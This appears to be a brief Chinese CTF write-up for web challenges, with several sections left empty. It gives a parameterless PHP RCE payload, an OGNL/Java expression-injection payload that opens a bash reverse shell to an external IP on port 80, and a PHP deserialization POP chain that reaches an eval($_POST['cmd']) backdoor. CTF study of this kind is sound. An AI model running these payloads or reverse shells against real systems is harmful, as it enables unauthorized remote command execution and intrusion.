# web
### babyphp
#无参rce 
`command=show_source(array_rand(array_flip(scandir(getcwd()))));`


### pain
#ongl #java 0
表达式注入,使用unicode编码绕过
```shell
(new java.lang.ProcessBuilder(new java.lang.String[]{'bash','-c','bash -i >& /dev/tcp/54.255.166.12/80 0>&1'})).start()
```
先unicode编码后url编码

### 我全都要
```php
<?php
highlight_file(__FILE__);

class B{
    public $pop;
    public $i;
    public $nogame;

    public function __destruct()
    {
        if(preg_match("/233333333/",$this->pop)){
            echo "这是一道签到题，不能让新生一直做不出来遭受打击";
        }
    }

    public function game(){
        echo "扣1送地狱火";
        if ($this->i = "1"){
            echo '<img src=\'R.jpg\'>';
            $this->nogame->love();
        }
    }

    public function __clone(){
        echo "必须执行";
        eval($_POST["cmd"]);
    }
}


class A{
    public $Aec;
    public $girl;
    public $boy;

    // public function __toString()
    // {
    //     echo "I also want to fall in love";
    //     if($this->girl != $this->boy && md5($this->girl) == md5($this->boy)){
    //         $this->Aec->game();
    //     }
    // }


}


class P{
    public $MyLover;
    public function __call($name, $arguments)
    {
        echo "有对象我会在这打CTF???看我克隆一个对象！";
        if ($name != "game") {
            echo "打游戏去，别想着对象了";
            $this->MyLover = clone new B;
        }
    }


}

$a=new B();
$b=new A();
$c=new P();
$d=new B();

$a->pop=$b;
$b->boy=array('a');
$b->girl=array('b');
$b->Aec=$d;
$d->i=1;
$d->nogame=$c;
$c->MyLover=$d;
echo(serialize($a));
```

### DoyouknowCC


# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2023-09-08   14:57